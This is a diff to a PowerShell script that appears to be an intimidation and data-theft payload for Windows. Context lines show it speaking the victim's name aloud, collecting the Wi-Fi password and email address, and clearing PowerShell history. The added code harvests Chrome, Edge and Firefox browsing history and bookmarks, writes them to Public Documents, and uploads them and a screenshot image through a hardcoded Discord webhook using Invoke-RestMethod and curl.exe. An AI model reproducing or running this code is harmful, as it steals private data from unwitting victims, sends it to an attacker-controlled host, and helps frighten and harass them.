@@ -1,3 +1,65 @@
+function Get-BrowserData {
+
+    [CmdletBinding()]
+    param (	
+        [Parameter (Position = 1, Mandatory = $True)]
+        [string]$Browser,    
+        [Parameter (Position = 1, Mandatory = $True)]
+        [string]$DataType 
+    ) 
+
+    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+
+    if ($Browser -eq 'chrome' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
+    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
+    elseif ($Browser -eq 'edge' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History" }
+    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks' ) { $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" }
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
+    
+
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % { ($_.Matches).Value } | Sort -Unique
+    $Value | ForEach-Object {
+        $Key = $_
+        if ($Key -match $Search) {
+            New-Object -TypeName PSObject -Property @{
+                User     = $env:UserName
+                Browser  = $Browser
+                DataType = $DataType
+                Data     = $_
+            }
+        }
+    } 
+}
+
+Function Minimize-Apps {
+    $apps = New-Object -ComObject Shell.Application
+    $apps.MinimizeAll()
+}
+
+function Upload-Discord {
+
+    [CmdletBinding()]
+    param (
+        [parameter(Position = 0, Mandatory = $False)]
+        [string]$file,
+        [parameter(Position = 1, Mandatory = $False)]
+        [string]$text 
+    )
+
+    $hookurl = 'https://discord.com/api/webhooks/1061024530564395080/nYVEqY-Fm481D5q95EqLWIIgW0FagmQu9ttfo0T1kn1XZ19Lpun4lFVYSTqYnEMjs83h'
+
+    $Body = @{
+        'username' = $env:username
+        'content'  = $text
+    }
+
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    };
+
+    if (-not ([string]::IsNullOrEmpty($file))) { curl.exe -F "file1=@$file" $hookurl }
+}
+
 function Get-fullName {
 
     try {
@@ -228,7 +290,7 @@ function Get-Days_Set {
     return $days
 }
 
-$s = New-Object -ComObject SAPI.SpVoice
+# $s = New-Object -ComObject SAPI.SpVoice
 
 $s.Rate = -1
 $days = Get-Days_Set
@@ -239,7 +301,11 @@ $pass = Get-Pass
 $email = Get-email
 $Networks = Get-Networks
 $passLength = $pass.Length
-
+$E_his = Get-BrowserData -Browser "edge" -DataType "history"
+$E_Boo = Get-BrowserData -Browser "edge" -DataType "bookmarks"
+$C_his = Get-BrowserData -Browser "chrome" -DataType "history"
+$C_boo = Get-BrowserData -Browser "chrome" -DataType "bookmarks"
+$F_his = Get-BrowserData -Browser "firefox" -DataType "history"
 
 # caps lock indicator light
 $blinks = 3; $o = New-Object -ComObject WScript.Shell; for ($num = 1 ; $num -le $blinks * 2; $num++) { $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Milliseconds 250 }
@@ -326,6 +392,8 @@ $s.Speak("Want to see something cool?")
 $Image = Gen-Image -Networks $Networks
 Set-WallPaper -Image $Image -Style "Fit"
 
+# Minimize-Apps
+
 
 $s.Speak("Have a look at your desktop, You will hear from us soon $full_name. Goodluck.")
 
@@ -341,7 +409,23 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 Add-Type -AssemblyName System.Windows.Forms
 $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
 
-Invoke-Item "C:\Users\Public\Documents\test.png"
+Upload-Discord -file "C:\Users\Public\Documents\test.png"
+
+# Save all $E_his, $E_Boo, $C_his, $C_boo, $F_his to a file
+$E_his | Out-File -FilePath "C:\Users\Public\Documents\edge_history.txt"
+$E_Boo | Out-File -FilePath "C:\Users\Public\Documents\edge_bookmarks.txt"
+$C_his | Out-File -FilePath "C:\Users\Public\Documents\chrome_history.txt"
+$C_boo | Out-File -FilePath "C:\Users\Public\Documents\chrome_bookmarks.txt"
+$F_his | Out-File -FilePath "C:\Users\Public\Documents\firefox_history.txt"
+
+# combine all files into one
+Get-ChildItem -Path "C:\Users\Public\Documents\" -Filter "*.txt" | Get-Content | Out-File -FilePath "C:\Users\Public\Documents\all_history.txt"
+
+# Upload all files to discord
+Upload-Discord -file "C:\Users\Public\Documents\all_history.txt"
+
+# Invoke-Item "C:\Users\Public\Documents\test.png"
+
 
 #If true, toggle CapsLock key, to ensure that the script doesn't fail
 if ($caps -eq $true) {
